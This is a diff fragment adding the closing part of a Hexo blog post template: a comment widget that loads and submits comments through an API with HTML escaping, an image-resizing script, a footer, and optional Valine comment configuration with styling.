+        if (!text) return '';
+        return text
+            .replace(/&/g, "&amp;")
+            .replace(/</g, "&lt;")
+            .replace(/>/g, "&gt;")
+            .replace(/"/g, "&quot;")
+            .replace(/'/g, "&#039;");
+    }
+
+    // Load comments
+    fetch(`${apiUrl}/api/comments?url=${encodeURIComponent(postUrl)}`)
+        .then(response => response.json())
+        .then(data => {
+            commentList.innerHTML = '';
+            if (data.comments && data.comments.length > 0) {
+                data.comments.forEach(comment => {
+                    const div = document.createElement('div');
+                    div.className = 'comment-item';
+                    
+                    let authorHtml = `<span class="comment-author">${escapeHtml(comment.nickname)}</span>`;
+                    if (comment.website) {
+                        authorHtml = `<a href="${escapeHtml(comment.website)}" target="_blank" class="comment-author">${escapeHtml(comment.nickname)}</a>`;
+                    }
+
+                    div.innerHTML = `
+                        <div class="comment-header">
+                            ${authorHtml}
+                            <span class="comment-date">${formatDate(comment.timestamp)}</span>
+                        </div>
+                        <div class="comment-content">${escapeHtml(comment.content)}</div>
+                    `;
+                    commentList.appendChild(div);
+                });
+            } else {
+                commentList.innerHTML = '<p>No comments yet. Be the first!</p>';
+            }
+        })
+        .catch(err => {
+            console.error('Error loading comments:', err);
+            commentList.innerHTML = '<p>Error loading comments.</p>';
+        });
+
+    // Submit comment
+    commentForm.addEventListener('submit', function(e) {
+        e.preventDefault();
+        
+        const nickname = document.getElementById('c-nickname').value;
+        const email = document.getElementById('c-email').value;
+        const website = document.getElementById('c-website').value;
+        const content = document.getElementById('c-content').value;
+
+        submitBtn.disabled = true;
+        submitBtn.innerText = 'Submitting...';
+
+        fetch(`${apiUrl}/api/comment`, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+                post_url: postUrl,
+                nickname: nickname,
+                email: email,
+                website: website,
+                content: content
+            })
+        })
+        .then(response => response.json())
+        .then(data => {
+            if (data.message) {
+                // Add new comment to list immediately
+                const div = document.createElement('div');
+                div.className = 'comment-item';
+                div.innerHTML = `
+                    <div class="comment-header">
+                        <span class="comment-author">${escapeHtml(nickname)}</span>
+                        <span class="comment-date">Just now</span>
+                    </div>
+                    <div class="comment-content">${escapeHtml(content)}</div>
+                `;
+                
+                // Insert at the beginning or append if empty
+                if (commentList.querySelector('.comment-item')) {
+                    commentList.insertBefore(div, commentList.firstChild);
+                } else {
+                    commentList.innerHTML = '';
+                    commentList.appendChild(div);
+                }
+                
+                commentForm.reset();
+            } else {
+                alert('Error: ' + (data.error || 'Unknown error'));
+            }
+        })
+        .catch(err => {
+            console.error('Error submitting comment:', err);
+            alert('Error submitting comment');
+        })
+        .finally(() => {
+            submitBtn.disabled = false;
+            submitBtn.innerText = 'Submit';
+        });
+    });
+})();
+</script>
+
+    
+
+
+</div>
+<script>
+    window.onload = ()=>{
+
+        document.title = document.querySelector('.post-title p').innerText;
+
+        var zoomImgs = function() {
+            const images = document.querySelectorAll('.post-content img'); // Only select images in post content
+            images.forEach(img => {
+                img.style.width = '70%'
+                img.style.height = 'auto'
+            });
+        }
+
+        zoomImgs()
+    }
+    
+</script>
+    
+    <div class="footer" id="footer">
+    <p>Copyright © 2020 <a class="flink" target="_blank" rel="noopener" href="https://hexo.io">Hexo</a>-<a class="flink" target="_blank" rel="noopener" href="https://github.com/sanjinhub/hexo-theme-geek">Geek</a>.
+    </p>
+</div>
+
+<input type="hidden" id="valine_appid" value="diYBpeShV6s47KsfNez5JmBU-gzGzoHsz">
+<input type="hidden" id="valine_appKey" value="u3BEDbLDNridDApcAzJBWc9N">
+<input type="hidden" id="valine_enable" value="false">
+<input type="hidden" id="valine_placeholder" value="留下你的评论吧...">
+<input type="hidden" id="valine_avatar" value="hide">
+
+
+<script src="/libs/jquery.min.js"></script>
+
+
+<script src="/js/lightbox.js"></script>
+
+
+
+<script>
+
+    var valine_appid = $("#valine_appid").val();
+    var valine_appKey = $("#valine_appKey").val();
+    var valine_enable = $("#valine_enable").val();
+    var valine_placeholder = $("#valine_placeholder").val();
+    var valine_avatar = $("#valine_avatar").val();
+
+    if(valine_enable == 'true'){
+        // Valine initialization code only if enabled
+        if (typeof Valine !== 'undefined') {
+            new Valine({
+                el: '#vcomments',
+                appId: valine_appid,
+                appKey: valine_appKey,
+                placeholder: valine_placeholder,
+                avatar: valine_avatar,
+            })
+        }
+    }
+
+</script>
+
+<style type="text/css">
+.v * {
+    color: #698fca;
+}
+
+.v .vlist .vcard .vhead .vsys {
+    color: #3a3e4a;
+}
+
+.v .vlist .vcard .vh .vmeta .vat {
+    color: #638fd5;
+}
+
+.v .vlist .vcard .vhead .vnick {
+    color: #6ba1ff;
+}
+
+.v a {
+    color: #8696b1;
+}
+
+.v .vlist .vcard .vhead .vnick:hover {
+    color: #669bfc;
+}
+</style>
+</body>
+
+</html>
